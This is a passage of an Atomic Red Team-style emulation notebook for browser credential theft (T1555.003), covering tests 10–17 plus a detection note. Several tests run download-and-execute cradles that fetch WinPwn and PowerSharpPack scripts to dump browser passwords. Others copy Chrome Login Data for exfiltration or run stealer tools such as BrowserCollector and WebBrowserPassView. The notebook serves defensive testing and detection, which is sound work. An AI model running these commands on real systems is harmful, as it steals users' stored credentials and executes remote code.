   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   \nRemove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f982d5ba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5ae5c151",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - WinPwn - BrowserPwn",
    "Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbrowserpwn -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b10b476d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "1aadb57c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nrm .\\System.Data.SQLite.dll -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9831138",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 11 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "07a81920",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - WinPwn - Loot local Credentials - mimi-kittenz",
    "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nkittenz -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "75b6c7b2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "f171b529",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
    "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')\nInvoke-Sharpweb -command \"all\"```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c10a4392",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "410142d7",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Simulating Access to Chrome Login Data - MacOS",
    "This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. \nOnce the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. \nSee https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . \n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data\" \"/tmp/T1555.003_Login Data\"\ncp ~/Library/\"Application Support/Google/Chrome/Default/Login Data For Account\" \"/tmp/T1555.003_Login Data For Account\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "735f9e9a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "414cce08",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm \"/tmp/T1555.003_Login Data\" >/dev/null 2>&1\nrm \"/tmp/T1555.003_Login Data For Account\" >/dev/null 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30604885",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 14 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b93c5ccf",
   "metadata": {},
   "source": "### Atomic Test #15 - WebBrowserPassView - Credentials from Browser\nThe following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile \"PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b250dd15",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 15 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "01e088f5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process \"PathToAtomicsFolder\\T1555.003\\bin\\WebBrowserPassView.exe\"\nStart-Sleep -Second 4\nStop-Process -Name \"WebBrowserPassView\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c992209d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "a8ce2337",
   "metadata": {},
   "source": "### Atomic Test #16 - BrowserStealer (Chrome / Firefox / Microsoft Edge)\n[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Google Chrome must be on the device.\n\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n\n```\n##### Description: BrowserCollector must exist in the bin directory\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\T1555.003\\bin\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\bin\\BrowserCollector.exe\"\n```\n##### Description: Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to \"steal.\" Must exist at the specified path.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T155.003/src/LoginData?raw=true\" -Outfile: \"PathToAtomicsFolder\\T1555.003\\src\\Login Data\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c9bbb98",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 16 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "22743cd8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" > $null\nRemove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null\ncd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"\n.\\BrowserCollector.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bbe394f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "859b6260",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" > $null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f4de05a9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ae69d02a",
   "metadata": {},
   "source": "### Atomic Test #17 - Dump Chrome Login Data with esentutl\nThis test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.\n[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Chrome must be installed\n\n##### Check Prereq Commands:\n```cmd\nif ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be1ff210",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 17 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c0efd4c5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nesentutl.exe /y \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\" /d \"%temp%\\T1555.003_Login_Data.tmp\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e0eb756",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "1fb90d1e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel /f /q %temp%\\T1555.003_Login_Data.tmp > nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79d8b27a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "85c5da3a",
   "metadata": {},
   "source": "## Detection\nIdentify web browser files that contain credentials such as Google Chrome\u2019s Login Data database file: <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}